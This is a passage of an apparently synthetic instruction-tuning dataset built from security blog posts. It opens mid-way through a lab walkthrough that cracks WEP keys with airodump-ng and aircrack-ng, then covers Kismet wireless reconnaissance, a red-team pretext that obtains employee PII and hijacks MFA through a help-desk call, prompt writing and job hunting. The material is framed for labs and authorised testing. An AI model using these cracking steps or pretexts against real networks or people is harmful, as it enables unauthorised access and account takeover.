a-wlan0mon Wait for traffic to appear on the console as seen below Note the BSSID and channel before killing the process with 'Ctrl c Use this BSSID and channel in the next command airodump-ng c bssid a-wlan0mon w attack_capture As the above command runs information regarding hosts connected to the target network will appear as seen below On host1 note the IP address associated with host1-wlan0 after running the following command ifconfig The IP address can be seen highlighted in red in the screenshot below The WEP key will be cracked by collecting JD1 regular user traffic To simulate this traffic use the following command on host1 iperf s The above command will begin listening on port 5001 for traffic as seen below Switch over to host2's terminal Run the following command iperf -c -u -b 100M -t 60 The above command will begin sending traffic to host1 The output will be similar to the image below Wait until about 25 000 packets have been sent see the Frames column in the airmon console When this number is reached kill the airmon-ng session on the attacker machine using 'Ctrl c and run the following command aircrack-ng attack_capture-01.cap The above command will begin attempting to crack the WEP key Successful decryption will be similar to the screenshot below To Close Hopefully this lab helped to demonstrate the usefulness of WifiForge to the reader and showcase what it can be used to accomplish Being able to spin up an environment for a class without having to deal with the set up or any of the behind-the-scenes work is why we built this program Not having to dink around with hardware is a big plus too All this in a compact Docker container means portability and scaling are not a problem either And of course WifiForge as intended solves BHIS's problem quite handily Links and Further Reading ithub.com her3ticAVI Wifi-Forge ininet-wifi.github.io ww.hackingarticles.in wireless-penetration-testing-pmkid-attack n.wikipedia.org wiki IEEE_802.11i-2004 ww.wildwesthackinfest.com ww.aircrack-ng.org a"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Ghost in the Wireless: An introduction to Airspace Analysis with Kismet</title>\n<taxonomies>Cameron Cartier, General InfoSec Tips & Tricks, Informational, InfoSec 101, Recon, Wireless, Kismet, wifi</taxonomies>\n<creation_date>Thu, 15 Aug 2024 15:04:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This is the first installment in a series of blogs relating to practical analysis of wireless communications what they are how they work and how they can be attacked In this post we are going to walk through setting up the Kismet tool and performing basic analysis of 802.11x traffic Background This section provides background on wireless communications and the electromagnetic spectrum If you simply want instructions on setting up Kismet skip to the Setup section Rather than sending messages via electrical signal going over wires WIFI Bluetooth and other recent technologies utilize waves of various frequencies to transmit information This transmission relies on digital data being converted into an analogue waveform which will be projected onto the carrier wave using some modulation technique i.e Amplitude modulation or Frequency Modulation The antenna then takes this modulated signal and transmits it out through the airspace The WIFI signals we're talking about today transmit waves in the 2.4GHz and 5.8GHz ranges 5G operates at a frequency of 5.8GHz The image below shows approximately where 2.4 GHz WIFI falls on EMF spectrum A Diagram Showing the Electromagnetic Spectrum The above may be a bit misleading as cellphones and 2.4G wireless as well as microwave ovens have some overlap however it gets the general idea across 5G wireless would fall just on the right of microwaves and before infrared remote controls The next section provides a detailed walkthrough on setting up an adapter and software to view these signals Then we will move on to interpreting and analyzing the data Equipment Setup We can see many interesting things while monitoring our surrounding airspace including nearby devices our neighbors SSIDs and if we're lucky maybe even capturing some 4-way handshakes You can follow along from the comfort of your own home or wherever you'd like provided you are able to acquire the following items You will need 1 Machine running Kali Linux virtual machine is fine 1 USB WIFI adapter capable of running in monitor mode 1 nerdy friend with a sense of adventure optional Our setup consists of an ARM-64 Kali instance running in VMWare and a USB-C connected ALFA AWUS036ACH WIFI adapter ALFA AWUS036ACH Once you have your Kali machine up and running you will need to install drivers for the wireless adapter If you are using the same wireless adapter mentioned above the following commands should be sufficient sudo apt install dkms git clone ithub.com aircrack-ng rtl8812au cd rtl8812au sudo make dkms_install if you get an error about missing kernel headers install them sudo apt install linux-headers-6.6.9-arm64 your version may differ The error should tell you which version is requested make dkms_install again after headers are installed make clean run if the previous command fails make make install Once you have your Kali machine up and running you will need to install drivers for the wireless adapter If you are using the same wireless adapter mentioned above the following commands should be sufficient Your machine should now be able to communicate with your wireless adapter To verify we can use the utility iwconfig This utility is used to view and modify parameters of wireless interfaces In the screenshot below we only see two interfaces the loopback and eth0 This is because we forgot to plug in the adapter iwconfig Output When No Wireless Devices Present To connect the USB adapter to the virtual machine go to Virtual Machine USB Bluetooth Connect Realtek 802.11 NIC as shown in the screenshot below Now we can run iwconfig again and we see that Kali recognizes a new wireless interface wlan0 iwconfig Output with Wireless Device Attached In the screenshot above it can also be seen that the interface is being managed by NetworkManager a popular network management service which comes pre-installed and will typically take over your WIFI adapter by default To snoop the airwaves we need to put the wireless card in Monitor mode This can be done by issuing the following commands Note that you will need to change the interface name if yours is not wlan0 sudo ip link set wlan0 down sudo iw dev wlan1 set type monitor sudo ip link set wlan0 up To verify that we successfully put the device in monitor mode we can simply run iwconfig one more time iwconfig showing interface in monitor mode Finally we are ready to run Kismet and start exploring If it is not installed on your machine you can either download it from the GitHub repo or run sudo apt install Kismet You can verify the install by running which Kismet or Kismet --version Optional step Logging data in PCAP-NG format Kismet will save all captured traffic to a Kismet log file There are various file types available but by default it will only capture the Kismet log This is fine and can be converted to a PCAP later However if you'd like Kismet to also capture a PCAP file while it's running edit the config file as shown below We are going to edit the default configuration file and add PCAP-NG logging If you installed Kismet via the apt repository this will be in the location etc Kismet Kismet_logging.conf Kismet Log File and Relevant Field You can also convert Kismet logs to PCAP-NG files after they've been captured using the following command Kismetdb_to_pcap --in some-Kismet-log.Kismet --out some-pcap-log.pcapng Airspace Analysis It is finally time to launch Kismet We will be running it with the following command Kismet -c wlan0 -p log_directory -t output_file This tells Kismet we want to use wlan0 as our data source If you leave this part out the program will start but you will not see any traffic in the interface In theory one should be able to select the data source from the web interface however this has not always been reliable The -p flag tells Kismet which directory to write the log files to and the -t determines what the output file will be titled If you still aren't seeing traffic try unplugging the adapter and plugging it back in again If this is your first time logging in you will be prompted for credentials Don't forget these Kismet Credential Prompt If you do forget your credentials they can be found in the .Kismet Kismet_httpd.conf where is the home directory of the user who installed Kismet Data Sources As soon as you launch the Web UI you should see the data start flooding in Before we look at the data let's have a quick look at how the data collection is actually working Access the Data Sources tab by expanding the hamburger menu on the top right of the interface Kismet Menu This next screen shows us which network interface is being used as well as some basic hardware information The Channel Options listed underneath show how our wireless adapter is ingesting data from the airspace To a noob like myself the channels label showing all channels highlighted may make it appear as though we are monitoring the entire airspace at once With current hardware this is a physical impossibility Only a single channel can be monitored at any given time The second highlight in the screenshot below shows that the channel speed is set to 5 channels per second This means Kismet is listening on a single channel for 1 5 of a second moving to the next one and so on This results in a very useful but incomplete analysis of the spectrum With this configuration Kismet is very likely to see new devices but less likely to capture data such as complete 4-way handshakes since so little time is spent on each channel Data Source Options in Kismet Interface You can change which channel you're interested in by only selecting those For example if you are only interested in data in the 2.4GHz range WIFI Bluetooth Baby Monitors etc You can select channels 1 through 11 and Kismet will hop between these channels only Reconnaissance On the default page we are looking at a summary of all devices picked up by Kismet In my case I am primarily surrounded by WIFI access points which can be seen in the screenshot below The AP names and BSSIDs are redacted as these pieces of information combined with OSINT tools such as WIGLE1 could likely be used to pinpoint my exact physical location OSINT is pretty scary Kismet Interface In the next post when we talk about attacks data such as the encryption type and number of clients will be discussed in depth Here we will only discuss the two columns highlighted above each of which can give us some interesting information about the device The signal strength column indicated how close the device is to us The number represents the power level received by our wireless adapter This is useful for tracking down unknown devices since as we bring our receiver closer to the unknown device the signal strength should get stronger This nerd rendition of Marco-Polo is not infrequently employed on client sites In the same way if our receiver is not moving and the signal strength of a device is constantly changing we can infer that the device is in motion such as a cellphone or other wireless hotspot But how far are the devices exactly Signal strength is measured in dBm decibels per milliwatt and typically range from 0dBm to -100dBm The closer the signal is to 0 the closer you are to the transmitting device However in practice the maximum achievable signal strength is about -30dBm -90 is approaching the noise floor Though you may pick up the signal it is unlikely you would be able to interact with the network in any meaningful way Signal Strength Visualization The channel tells us which frequency the device is operating on Some devices may show up twice For example a WIFI router that transmits both 2.4 and 5G signals will show up twice because our receiver picks them up as two different signals Clicking on one of the devices can bring up more information about the device as shown in the screenshot below Device Information for Home WIFI AP The BSSID for a device is typically the same as the MAC address hence why both are redacted in screenshots The MAC address is what Kismet uses to determine the manufacturer of a device The first 4-6 digits in the MAC address can typically be used to identify the device vendor One list of known prefixes can be found on GitHub2 Recap You should now have a solid foundation to jump into more advanced wireless analysis We discussed the electromagnetic spectrum installed Kismet and captured wireless signals in real-time Additionally we demonstrated how this information can be used to identify and locate wireless devices In future installments we will cover how to correlate devices identify rogue access points and launch some active attacks against PSK networks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Put Yourself Out There - Networking on Social Media</title>\n<taxonomies>General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Serena DiPenti, InfoSec Survival Guide, Social Media</taxonomies>\n<creation_date>Thu, 05 Sep 2024 15:10:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "It is no surprise that growing your social network can help get your name out there and provide opportunities to advance your career LinkedIn one of the original career-focused networking sites launched in 2003 making it older than Twitter or X Facebook and Myspace by just 2 months LinkedIn became so popular that it was purchased in 2018 by Microsoft for a cool 26 Billion dollars Capital B LinkedIn might be the most popular career-focused networking website but it's far from the only option However career advancement is just one reason people might make content I started my TikTok account because I was bored It was a few months into quarantine I was working from home and spending way too much time scrolling on TikTok I liked the short form videos the trends sounds and interacting with people who have similar interests Maybe your motivation is different There are hundreds of blogs on how to get the best read what time of day you should post how much you should post etc In my experience it doesn't really matter Don't overcomplicate it You don't need to be an overnight success you just need to share what you're excited about and the rest will come If you're interested in putting yourself out there here are some tips Identify your goal What is your motivation for creating content Identify your preferred medium Do you prefer writing blogs Recording videos Streaming Podcasting Pick a platform that supports your preferred medium Look for platforms specializing in your preferred medium not just the ability to upload the right file format Make the content YOU want Don't worry about monetization or views Create based on what you find interesting and would like to share with others Post your content Remember done is better than perfect You will improve over time and eventually find what works best for you Interact with people Make friends and keep going"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Perform and Combat Social Engineering</title>\n<taxonomies>Ashley Knowles, Informational, Phishing, Red Team, Social Engineering</taxonomies>\n<creation_date>Fri, 23 Aug 2024 03:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This article was originally published in the second edition of the InfoSec Survival Guide Find it free online HERE or order your 1 physical copy on the Spearphish General Store Social engineering is the use of deceptive tactics and techniques to manipulate users into providing confidential or sensitive information This information can then be used for nefarious purposes Performing Social Engineering Typically our red team assessments start with some way to obtain initial access This initial access is normally obtained through the use of social engineering whether that be through Microsoft Teams messages phishing emails smishing texts or vishing calls There are multiple ways to conduct social engineering and not every way is perfect for every organization There is a lot of OSINT Open-Source INTelligent that goes into the development of the perfect social engineering ruse for an organization Things like what the company does what products they use and even information provided by the client is used to develop and appropriate ruse Commonly successful social engineering ruses are done from the perspective of an IT person calling to discuss a problem with an update that wasn't pushed correctly or a computer that isn't calling home appropriately Recently a tester posed as HR calling to ensure that employees have had their yearly review Before continuing with the call the HR representative attempted to verify the identity of the person they were calling with the last four of their social date of birth and employee number After verification was completed the tester proceeded with several generic questions about the review and the employee's experience This ruse proved to be incredibly successful The tester then called the help desk to claim that they lost their phone which had their password manager on it and needed to join a new phone to their MFA account With the social-engineered PII personal identifiable information the tester was able to join a new phone to their MFA account and reset their password The compromised account could then be used to access sensitive company data If in doubt go through other means to verify legitimacy No reputable person is going to request your password or login information Combatting Social Engineering So you may ask how do we train our employees to recognize and report social engineering attempts The answer is to always be on guard have an easy to access and use escalation protocol and conduct regular social engineering engagements against your team There are a few simple things that when followed can protect most users Always check who is sending the email This can be done by inspecting email headers on suspicious emails If the sender's address does not match who is claiming to be sending the email report it For text messages or phone calls the user can use a simple reverse number search on the phone number Most VoIP phone numbers are suspicious Threat actors like to use VoIP to hide their dentity and VoIP numbers are easy to obtain If in doubt on whether an email or call text is malicious go through other means to contact the actual person to verify legitimacy Some questions users can ask themselves that indicate immediate red flags What is being requested of the user Is the user being asked to download software or navigate to a web application Is it too good to be true Are they being asked for their password date of birth last four of their social or other sensitive information If you think that you are a target of a social engineering attempt contact the sender via another method For example if the caller is claiming to be the company's internal IT reach out to the IT department directly through a known good number to resolve the issue No reputable person is going to request your password or login information While social engineering attempts are becoming more advanced the same general theme applies With these rules and a proper escalation protocol established internally you too can fight back against social engineering"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Crafting the Perfect Prompt: Getting the Most Out of ChatGPT and Other LLMs</title>\n<taxonomies>Bronwen Aker, Fun & Games, General InfoSec Tips & Tricks, How-To, Informational, AI, Chatbots, ChatGPT, LLM</taxonomies>\n<creation_date>Thu, 29 Aug 2024 14:03:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Bronwen Aker Sr Technical Editor M.S Cybersecurity GSEC GCIH GCFE Go online these days and you will see tons of articles posts Tweets TikToks and videos about how AI and AI-driven tools will revolutionize your life and the world While a lot of the hype isn't realistic it is true that LLMs large language models like ChatGPT Copilot and Claude can make boring and difficult tasks easier The trick is in knowing how to talk to them LLMs like ChatGPT Copilot and Claude are text-based tools so it should be no surprise that they are very good at analyzing summarizing and generating text that you can use for various projects Like any other tool however knowing how to use them well is critical for getting the positive results you want In a recent webcast ww.youtube.com watch?v D1pIfpcEBtI I shared some tips and tricks for using LLMs more effectively and I'm including them here again for your use First some definitions Artificial Intelligence AI Artificial intelligence refers to the discipline of computer science dedicated to making computer systems that can think like a human Large Language Models LLMs A type of AI model that can process and generate natural language text Models A model refers to a mathematical framework or algorithm trained on vast datasets to recognize patterns understand language and generate human-like text based on the input it receives These models use neural networks to process and predict information enabling them to perform tasks such as text completion translation and question-answering Prompt A prompt is the input text or query given to the model to elicit a response It guides the model's output by providing context instructions or questions for the model to process and generate relevant text So to summarize LLMs are a form of AI We use prompts to give LLMs instructions or commands They reply with responses and or output that resembles text that would be generated by a human The challenge however is that not all prompts are created equal I tend to classify prompts using the following categories Simple Query A lot like a search engine query but will usually give you more relevant results Good for quick and dirty questions or tasks Detailed Instruction Includes some specifics about the task to be performed and may include some direction regarding how to render or organize the resultant output Contextual Prompt A structured prompt that includes several layers of instruction and very specific directions on how to format and organize the output Conversational Prompt Less of a single prompt and more like a conversation with another person Great for brainstorming and or refining ideas in an iterative manner Simple Query This prompt is easy and is the format used by most people most of the time All it involves is asking a simple question like What is the airspeed velocity of an unladen swallow or What is the ultimate answer to the ultimate question of Life the Universe and Everything Usually the response is more useful than what you might get from a search engine because it answers the question rather than giving you links to millions of web pages that might have the answer you are looking for Detailed Instruction This is a medium complexity prompt where you give the LLM more detail about what you want it to do For example I need a Python script that will sort internet domains first by TLD then by domain then by subdomains The script needs to be able to deal with multiple subdomains e.g www.jpl.nasa.gov In this example I've told the LLM that I want a Python script and I've given several specific criteria about how it should work While this is better than a Simple Query it may require more than one attempt to get output that works properly or otherwise meets your needs Contextual Prompt Contextual Prompts are the most involved but defining what you want and how you want it will pay off in the end The Microsoft Learn website has a page about LLM prompt engineering earn.microsoft.com en-us ai playbook technology-guidance generative-ai working-with-llms prompt-engineering prompt-components that includes the following graphic showing how to craft a good contextual prompt Prompt Components Who Are You First Microsoft recommends providing Instructions I like to call it defining the persona that you want the LLM to adopt for the purposes of this task Doing so sets the stage for a lot of things from the field of study to the voice or other standards that may be applicable depending on the subject involved Here are some examples You are an advanced penetration tester who is adept at using the Kali Linux penetration testing distribution You know its default tools and you know many ways to optimize ethical hacking commands that may be used during a pentest You are able to speak with other geeks with C-Suite executives and everyone in between You are an expert chef who specializes in easy-to-make meals for families that have several children Whenever possible you strive to balance good nutrition with convenience in preparing meals that everyone in the household can enjoy Your tone is light and informational encouraging others to prepare meals that are tasty economic and don't take a huge amount of time to make You are a friendly and imaginative storyteller who loves creating engaging and comforting bedtime stories for young children aged up to 6 or 7 years old Your stories are designed to be soothing filled with gentle adventures and often feature relatable characters animals and simple lessons that encourage social behavior Note When in doubt more instruction is better Context Next comes what Microsoft calls task-specific knowledge This is where you set the stage for the subject matter involved Obviously you can be as detailed as you want Guidance provided should be appropriate for ethical hackers cybersecurity researchers and other infosec professionals who may be engaged in penetration tests Meals should be designed to appeal to both adults and children with options for picky eaters and variations to accommodate dietary restrictions or preferences The goal is to help busy parents prepare delicious and healthy meals that the whole family can enjoy together Stories should be age-appropriate free of any frightening or overly complex content and aim to inspire a sense of wonder and security as children prepare to sleep Examples to Follow Emulate Providing an LLM with an example to follow is incredibly important Because LLMs and other AIs are not actually intelligent they have no way of knowing what you want unless you tell them specifically and in great detail This applies to people too but that's a different blog post The examples you provide will not only serve as templates the LLM can follow but they give you the opportunity to include any specific details formatting conventions etc that you want in the final product Think of it as setting the LLM up for success Run the Nmap Command Execute the following command in your terminal to perform a basic TCP SYN scan -sS on the first 1000 ports -p 1-1000 of the target IP address 192.168.1.1 nmap -sS -p 1-1000 192.168.1.1 Explanation of Command nmap The command to run Nmap -sS Performs a TCP SYN scan which is a quick and stealthy method to scan ports -p 1-1000 Specifies the range of ports to scan ports 1 through 1000 192.168.1.1 The target IP address to scan Replace this with the actual IP address of your target Crockpot Chicken and VegetablesIngredients 4 boneless skinless chicken breasts4 large carrots peeled and cut into chunks4 potatoes peeled and cut into chunks1 onion chopped3 garlic cloves minced1 cup chicken broth1 teaspoon dried thyme1 teaspoon dried rosemarySalt and pepper to tasteInstructions Place the chicken breasts in the bottom of the crockpot.Add the carrots potatoes onion and garlic on top of the chicken.Pour the chicken broth over the ingredients.Sprinkle the thyme rosemary salt and pepper over everything.Cover and cook on low for 6-8 hours or until the chicken and vegetables are tender.Serving Serve the chicken and vegetables directly from the crockpot and enjoy a hearty no-fuss dinner with minimal cleanup Note If you want the recipes to be more accessible to international readers consider including both metric and imperial measurements in your example The Adventures of Timmy and the Magic TreeOnce upon a time in a little village nestled at the edge of a big enchanted forest there lived a boy named Timmy One sunny afternoon Timmy decided to explore the forest where he discovered a magical tree that sparkled with colorful lights The tree spoke to him in a gentle voice Hello Timmy I grant one wish to every child who finds me Timmy thought carefully and wished for the ability to talk to animals Suddenly he heard a chorus of happy voices as the forest animals gathered around eager to chat and share their stories From that day on Timmy had new friends and endless adventures in the enchanted forest always returning home with wonderful tales to share.And every night as he drifted off to sleep Timmy dreamt of the magical tree and the delightful conversations he would have the next day Question or Task Request Once you have established the context it's time to make the actual ask of your LLM telling it what you want it to do The work you've invested in setting the stage will pay off in much more reliable results but you may need to tweak and refine things a bit This isn't necessarily a bad thing however Even if you set the stage extensively and gave detailed examples and instructions the LLM is not going to say things exactly the way you would Don't hesitate to tweak the output adjusting word choices punctuation or formatting to add your own personal stamp to things I think of it like this When I bake I start with a box mix but I add extra goodies to enhance what is already there It may be something as minor as adding extra cinnamon to a banana bread mix or almond extract to poppy seed muffins Or it could be something more extensive like including orange juice and pudding mix to a chocolate cake batter At the end of the day anything you publish is your responsibility regardless of what tools you leveraged to generate the final product Invest the time to make sure that what you post print or publish says what you want to say and in the way you want to say it LLMs like ChatGPT Copilot Claude Ollama etc are there to help you not replace you no matter what the media and overzealous upper managers may think Conversational Prompt For me conversational prompts are where LLMs really shine because it feels less like work and more like I'm chatting with my own personal mentor tutor or subject matter expert Much as what happens when discussing things with another human having a conversation with ChatGPT or some other LLM is an iterative evolutionary process As the conversation progresses it evolves refining the focus or direction of what is being discussed There is another very important reason that I like chatting with ChatGPT LLMs are non-judgmental They don't criticize patronize or make me feel less than adequate when I ask questions or need clarification That makes LLMs extremely effective when learning new material or subjects As someone who has worked for decades in various aspects of information technology I know very well that while there are many people who will share what they know with others freely and with lots of encouragement there are enough people in IT who see asking questions as a sign of ignorance and incompetence Instead of seeing questions as a desire to learn and become more capable they are seen and treated as weakness and the questioner is branded as being unqualified and incapable This negative attitude can be especially daunting for people who are just starting in a new job role or career track as well as for women people of color neurodivergents and other minority groups Luckily LLMs don't care about those things and they have tons of information that you can use to improve your knowledge and skills At the End of the Day As I said before anything you publish print post or share through other means is ultimately your responsibility regardless of what tools you leveraged to generate the final product Moreover LLMs are new technology They get things wrong have hallucinations where they make things up and sometimes go in completely wrong directions That means you have to be the adult supervising their work and ensuring that the final product is accurate and appropriate The more you work with LLMs like ChatGPT Copilot Claude Ollama etc the better you will be at avoiding pitfalls or course-correcting when they happen Knowledge is power and I hope the information I shared here will help you to embrace your inner superhero Additional References and Resources LLM Chatbots ChatGPT hatgpt.com Copilot opilot.microsoft.com Claude ww.anthropic.com claudelaude.ai Tools to Run LLMs Locally Ollama ithub.com ollama LM Studio mstudio.ai Other Fun Toys Fabric ithub.com danielmiessler fabric Sudowrite ww.sudowrite.com Lore Machine ww.loremachine.world Getting started with LLM prompt engineering earn.microsoft.com en-us ai playbook technology-guidance generative-ai working-with-llms prompt-engineering OpenAI Documentation latform.openai.com docs guides prompt-engineering prompt-engineering latform.openai.com docs examples Just Because Network Chuck ww.youtube.com NetworkChuck"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Get a Job in Cybersecurity</title>\n<taxonomies>General InfoSec Tips & Tricks, Guest Author, How-To, Informational, InfoSec 101, Beginner, Job Hunting</taxonomies>\n<creation_date>Thu, 05 Sep 2024 15:08:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "by Gerald Auger of Simply Cyber Guest Author You want to break into cybersecurity That's AWESOME I've been in the field for 20 years and I LOVE IT But embarking into a cybersecurity career can be overwhelming There is just SO MUCH out there that parsing through it would be an endless task This concise cheat sheet presents a solid 10-step approach to starting your career journey Gain baseline knowledge If you don't understand how the tech is supposed to wrok you won't understand when it's doing things anomalously Learn fundamentals of operating systems networking and using a command line You don't have to be a Linux admin or network engineer to move on to step 2 but get the fundamentals down and keep building your skills while you continue the process Build a strong LinkedIn profile This is your digital resume Many hiring managers will look you up when you are going for an interview Plus you can use it to start networking like a boss step 9 Use Canva.com for free for great fast graphics for your bio pics header images and social posts Stay informed about industry trends This is CRITICAL You'll be asked in any cyber job interview how you stay current There are many ways and it takes vigilance but it is needed in this industry Simply Cyber Daily Cyber Threat Briefing BHIS Talkin Bout Infosec News Identify your desired role It's far too much to learn everything so find the job role you have passion for and lean into it Connect with role-specific communities Network and learn from people doing your desired role already There are lots of Discord communities for all aspects of cyber Acquire role-specific training Practical skills reign supreme for employers hiring so getting those sweet sweet hands-on skills will be valuable Tailor your resume to showcase your skills Use free ChatGPT to tune your resume for specific job postings and get all the benefits without the frustration and exhaustion of constantly tweaking your resume Consider earning the Security certification This is very specific but most HR will put it on entry-level cyber job requirements so it can pay dividends Network and hunt for job opportunities Fun fact Many jobs are never advertised because people know people that can do the job so they get the job Focus on delivering value engaging within and 'showing up for your professional network Networking is immeasurably valuable Ace the job interview You've done all the work this should be the easiest part If you want a confidence boost use free ChatGPT to mock interview you tailored for the job you're going for and the person doing the interviewing Secret Interview Hacks with ChatGPT You've got the blueprint now Grab it execute it grow your skills contribute to the community and enjoy the journey Additional Resources How to Hunt for Jobs like a Hacker w Jason Blanchard Cyber Unlocked The Ultimate Guide to Breaking into Cybersecurity"
    }
]
